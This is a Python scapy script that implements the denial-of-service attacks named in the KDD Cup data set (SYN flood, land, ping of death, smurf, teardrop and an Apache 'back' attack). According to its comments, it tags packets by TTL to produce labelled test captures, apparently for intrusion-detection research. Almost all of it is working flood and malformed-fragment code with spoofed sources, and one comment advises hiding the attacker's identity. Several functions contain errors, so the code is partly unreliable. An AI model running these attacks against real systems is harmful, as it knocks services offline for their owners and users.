# This is all the Denial of service attacks that are described in the the
# KDD Cup Data Set
# As the KDD Cup does NOT use TTL, I will use that to "label" Test PCAPs
# This will increase by increments of 10....
from scapy.all import *


# Denial of service attack against apache web server where a client
# requests a URL containing many backslashes
# Can just try the HTTP LIB to use this for us?
def back(target_ip, payload, target_port=80):
    # Given a URL, attempt to go into root? If failed at attempt 1, don't try anymore?
    back_attack = IP(src="127.0.0.1", dst=target_ip, ttl=10) / TCP(flags="S", sport=RandShort() / Raw(payload=payload), dport=int(target_port), timeout=2)
    replies = sr(back_attack)
    for packet in replies:
        print(packet)


# SYN flood denial of service on one or more ports - Neptune
# You can use the id and ttl fields to help hide the identity of the attacker
def syn_flood(target_ip, target_port, packets_send=1000000):
    count = 0
    print("START SYN_FLOOD")
    while count < packets_send:
        # Creates the packet and assigns it to variable a
        a = IP(id=1111, src="127.0.0.1", dst=target_ip, ttl=20)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
        send(a)  # Sends the Packet
        count = count + 1
        # print(str(count) + " Packets Sent")

    # another way to do this is to use
    # ans, unans = srloop(p, inter=0.3, retry=2, timeout=4)
    # ans.summary()
    # unans.summary()
    print("END_SYN_FLOOD")


# Denial of service where a remote host is sent a UDP packet with the
# same source and destination
def land(target_ip, target_port, packets_send=10000):
    count = 0
    while count < packets_send:
        send(IP(src=target_ip, dst=target_ip, ttl=30) / UDP(sport=target_port, dport=target_port))
        count = count + 1
    print("Land attack complete!")


# Denial of service ping of death
# Send a malicious ping to another computer that exceeds that maximum IPv4
# packet size which is 65,535 bytes
def pod(target_ip):
    send(fragment(IP(dst=target_ip, ttl=40/ICMP()/('X'*60000))))


# Denial of service icmp echo reply flood
def smurf(source_ip, target_ip, packets_send=10000):
    count = 0
    while count < packets_send:
        send(IP(src=source_ip, dst=target_ip, ttl=50) / ICMP())
        count = count + 1
    print("Land attack complete!")


# Denial of service where mis-fragmented UDP packets cause some
# systems to reboot
# Code taken from:
# https://samsclass.info/123/proj10/teardrop.htm
def teardrop(target, attack):
    print('Attacking target ' + target + ' with attack ' + attack)
    print("   Attack Codes:                                           ")
    print("   0: small payload (36 bytes), 2 packets, offset=3x8 bytes")
    print("   1: large payload (1300 bytes), 2 packets, offset=80x8 bytes")
    print("   2: large payload (1300 bytes), 12 packets, offset=80x8 bytes")
    print("   3: large payload (1300 bytes), 2 packets, offset=3x8 bytes")
    print("   4: large payload (1300 bytes), 2 packets, offset=10x8 bytes")
    if attack == '0':
        print("Using attack 0")
        size = 36
        load1 = "\x00" * size

        i = IP(ttl=60)
        i.dst = target
        i.flags = "MF"
        i.proto = 17

        size = 4
        offset = 18
        load2 = "\x00" * size

        j = IP(ttl=60)
        j.dst = target
        j.flags = 0
        j.proto = 17
        j.frag = offset

        send(i / load1)
        send(j / load2)

    elif attack == '1':
        print("Using attack 1")
        size = 1300
        offset = 80
        load = "A" * size

        i = IP(ttl=60)
        i.dst = target
        i.flags = "MF"
        i.proto = 17

        j = IP(ttl=60)
        j.dst = target
        j.flags = 0
        j.proto = 17
        j.frag = offset

        send(i / load)
        send(j / load)

    elif attack == '2':
        print("Using attack 2")
        print("Attacking with attack 2")
        size = 1300
        offset = 80
        load = "A" * size

        i = IP(ttl=60)
        i.dst = target
        i.proto = 17
        i.flags = "MF"
        i.frag = 0
        send(i / load)

        print("Attack 2 packet 0")

        for x in range(1, 10):
            i.frag = offset
            offset = offset + 80
            send(i / load)
            print("Attack 2 packet " + str(x))

        i.frag = offset
        i.flags = 0
        send(i / load)

    elif attack == '3':
        print("Using attack 3")
        size = 1336
        # offset = 3
        load1 = "\x00" * size

        i = IP(ttl=60)
        i.dst = target
        i.flags = "MF"
        i.proto = 17

        size = 4
        offset = 18
        load2 = "\x00" * size

        j = IP(ttl=60)
        j.dst = target
        j.flags = 0
        j.proto = 17
        j.frag = offset

        send(i / load1)
        send(j / load2)

    else:  # attack == 4
        print("Using attack 4")
        size = 1300
        offset = 10
        load = "A" * size

        i = IP(ttl=60)
        i.dst = target
        i.flags = "MF"
        i.proto = 17

        j = IP(ttl=60)
        j.dst = target
        j.flags = 0
        j.proto = 17
        j.frag = offset

        send(i / load)
        send(j / load)

    print("Done Executing Teardrop!!")


